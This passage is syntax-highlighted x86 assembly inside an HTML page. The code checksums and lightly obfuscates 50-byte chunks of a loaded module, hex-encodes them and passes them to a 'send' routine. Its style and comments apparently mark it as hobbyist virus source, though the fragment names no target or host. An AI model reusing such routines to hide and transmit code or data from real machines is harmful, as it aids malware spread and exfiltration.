</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">uploadinput</span><span class="sc4">,</span><span class="sc5">m56</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; load the data to be sent</span><span class="sc0">

</span><span class="sc5">CSyscall</span><span class="sc0">    </span><span class="sc5">getmodpointer</span><span class="sc0">           </span><span class="sc1">; then get the module pointer</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; set is as source</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc0">                  </span><span class="sc1">; load the offset from this</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                   </span><span class="sc1">; set the destination to</span><span class="sc0">
                        </span><span class="sc1">; checksum mark</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">gethatmo</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; make checksum of unencrypted</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; bytes</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">gethatmo</span><span class="sc0">                </span><span class="sc1">; do everything</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hex2ascii</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; save the checksum</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">getthatma</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; load the byte</span><span class="sc0">

</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; encrypt it </span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; ror al,cl is cool</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66</span><span class="sc0">                   </span><span class="sc1">; can make quite boring</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                        </span><span class="sc1">; to understand cryptation</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hex2ascii</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; drop the hex of the byte</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">getthatma</span><span class="sc0">               </span><span class="sc1">; perform the 50 bytes</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">107</span><span class="sc0">                 </span><span class="sc1">; set how much byte to send</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">directinput</span><span class="sc0">             </span><span class="sc1">; send them </span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">107</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">hex2ascii</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">                 </span><span class="sc1">; load 1st</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getitnow55</span><span class="sc0">              </span><span class="sc1">; convert 1 - 16 to ascii</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">                  </span><span class="sc1">; load 2nd</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getitnow55</span><span class="sc0">              </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; reverse to be put on mem</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">getitnow55</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">setitdigit</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc4">-</span><span class="sc12">'A'</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; for digit</span><span class="sc0">

</span><span class="sc5">setitdigit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc2">9</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; for bytes</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ascii2hex</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getitnow56</span><span class="sc0">          </span><span class="sc1">; transform from the byte </span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getitnow56</span><span class="sc0">          </span><span class="sc1">; to normal</span><span class="sc0">

</span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">getitnow56</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">              
    
</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                </span><span class="sc1">; a number ?</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">dontskipit</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; finish</span><span class="sc0">

</span><span class="sc5">dontskipit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc12">'0'</span><span class="sc4">-</span><span class="sc2">9</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; a word ? </span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">hex2val</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">getthatnowit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">              </span><span class="sc1">; load this value</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">; load byte</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; add it</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">               </span><span class="sc1">; load next ebx</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">getthatnowit</span><span class="sc0">            </span><span class="sc1">; do that 4 times,</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; MAX = 500000 bytes</span><span class="sc0">

</span><span class="sc1">;include prorec\prosere.asm</span><span class="sc0">

</span><span class="sc5">CSyscall0</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0">
</span><span class="sc5">CommodSyscall</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RoutineHandler</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">CommodEnd</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">skiploading</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
